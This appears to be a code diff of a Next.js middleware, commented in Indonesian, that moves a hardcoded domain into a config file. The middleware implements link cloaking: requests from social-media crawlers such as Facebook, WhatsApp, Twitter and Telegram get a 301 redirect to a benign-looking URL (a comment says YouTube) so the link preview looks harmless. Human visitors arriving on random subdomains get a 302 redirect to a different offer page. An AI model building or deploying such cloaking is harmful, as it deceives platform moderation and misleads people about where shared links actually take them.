@@ -1,4 +1,6 @@
 import { NextResponse } from 'next/server';
+// 1. KITA TARIK CONFIG DARI LUAR (ROOT)
+import { appConfig } from './config.js';
 
 const isBot = (userAgent) => {
   const bots = ['facebookexternalhit', 'whatsapp', 'twitterbot', 'telegrambot'];
@@ -15,31 +17,34 @@ const isSocialApp = (userAgent, referer) => {
 export async function middleware(request) {
   const url = request.nextUrl;
   const path = url.pathname;
-  const hostname = request.headers.get('host') || ''; // Ambil nama domain yang lagi diakses
+  const hostname = request.headers.get('host') || ''; 
 
-  // Jangan cegat aset Next.js atau halaman form admin
-  if (path.startsWith('/_next') || path.includes('.') || path.startsWith('/admin')) {
+  // Jangan cegat aset Next.js, halaman form admin, dan script penarik judul (API)
+  if (path.startsWith('/_next') || path.includes('.') || path.startsWith('/admin') || path.startsWith('/api')) {
     return NextResponse.next();
   }
 
   // --- DETEKSI APAKAH INI SUBDOMAIN (stringacak) ATAU DOMAIN UTAMA ---
-  const isSubdomain = hostname.includes('.copbhghuytr.eu.org') && !hostname.startsWith('www.');
+  // 2. KITA PAKAI DOMAIN DARI CONFIG, JADI BUKAN HARDCODE LAGI
+  const domainAktif = appConfig.DOMAIN;
+  const isSubdomain = hostname.includes(`.${domainAktif}`) && !hostname.startsWith('www.');
+  
   let slug = null;
   let isStage1 = false;
 
   if (isSubdomain) {
-    // Kalau diakses dari lk1d6j.sekonlive.eu.org, ambil 'lk1d6j'
+    // Kalau diakses dari stringacak.domain.com, ambil 'stringacak'
     slug = hostname.split('.')[0]; 
     isStage1 = true;
   } else {
-    // Kalau diakses dari sekonlive.eu.org/lk1d6j/title-offer2, ambil 'lk1d6j'
+    // Kalau diakses dari domain.com/stringacak/title-offer2, ambil 'stringacak'
     const pathParts = path.split('/').filter(Boolean);
     if (pathParts.length > 0) {
       slug = pathParts[0];
     }
   }
 
-  // Kalau orang cuma buka web utama "sekonlive.eu.org/", biarin nampil Coming Soon
+  // Kalau orang cuma buka web utama, biarin nampil Coming Soon
   if (!isSubdomain && path === '/') {
     return NextResponse.next();
   }
@@ -69,18 +74,18 @@ export async function middleware(request) {
   const userAgent = request.headers.get('user-agent') || '';
   const referer = request.headers.get('referer') || '';
 
-  // --- TAHAP 1: Akses via Subdomain (Contoh: lk1d6j.sekonlive.eu.org) ---
+  // --- TAHAP 1: Akses via Subdomain (Contoh: lk1d6j.domain.com) ---
   if (isStage1) {
     if (isBot(userAgent)) {
       // Bot sosmed datang -> Lempar ke YouTube biar Preview-nya muncul
       return NextResponse.redirect(linkData.offer2_url, 301);
     } else {
-      // Manusia ngeklik -> Ubah URL jadi panjang dan rapi
-      return NextResponse.redirect(`https://copbhghuytr.eu.org/${slug}/${linkData.path_tambahan}`, 302);
+      // Manusia ngeklik -> Ubah URL jadi panjang dan rapi (Pakai variabel domainAktif)
+      return NextResponse.redirect(`https://${domainAktif}/${slug}/${linkData.path_tambahan}`, 302);
     }
   }
 
-  // --- TAHAP 2: Akses via Link Rapi (Contoh: sekonlive.eu.org/lk1d6j/title-offer2) ---
+  // --- TAHAP 2: Akses via Link Rapi (Contoh: domain.com/lk1d6j/title-offer2) ---
   if (!isSubdomain) {
     const pathParts = path.split('/').filter(Boolean);
     
